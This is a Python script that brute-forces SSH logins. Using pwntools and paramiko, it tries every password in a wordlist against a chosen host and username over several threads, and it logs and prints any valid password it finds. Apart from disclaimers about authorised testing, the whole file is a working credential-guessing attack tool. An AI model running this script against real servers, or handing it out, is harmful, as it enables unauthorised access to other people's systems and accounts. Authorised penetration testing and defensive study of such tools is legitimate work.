import paramiko
from pwn import ssh
import argparse
import logging
from concurrent.futures import ThreadPoolExecutor

# Argument parser setup
def parse_arguments():
    parser = argparse.ArgumentParser(description="SSH Brute Force Script for authorized penetration testing.")
    parser.add_argument("--host", required=True, help="Hostname or IP Address of the target SSH server")
    parser.add_argument("--username", required=True, help="Username for the SSH login")
    parser.add_argument("--password_file", required=True, help="File path for the list of passwords to try")
    parser.add_argument("--threads", type=int, default=4, help="Number of threads to use for brute forcing")
    return parser.parse_args()

# Setup logging
def setup_logging():
    logging.basicConfig(filename='ssh_bruteforce.log', filemode='a', format='%(asctime)s - %(levelname)s - %(message)s', level=logging.INFO)

# Attempt SSH login with a password
def attempt_ssh_login(host, username, password):
    try:
        response = ssh(host=host, user=username, password=password, timeout=1)
        if response.connected():
            logging.info(f"Valid password found: {password}")
            print(f"[>] Valid password found: {password}!")
            response.close()
            return True
        response.close()
    except paramiko.ssh_exception.AuthenticationException:
        logging.info(f"Invalid password: {password}")
    except Exception as e:
        logging.error(f"An unexpected error occurred: {e}")
    return False

# Main function to handle the SSH brute force attempt
def main(args):
    setup_logging()
    logging.warning("WARNING: This script is for educational and testing purposes only.")
    logging.warning("Do not use on any network or system without explicit authorization.")
    
    # Print warnings to console
    print("WARNING: This script is for educational and testing purposes only.")
    print("Do not use on any network or system without explicit authorization.")

    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        with open(args.password_file, "r") as file:
            passwords = (line.strip() for line in file)
            for password in passwords:
                executor.submit(attempt_ssh_login, args.host, args.username, password)

# Entry point of the script
if __name__ == "__main__":
    args = parse_arguments()
    main(args)
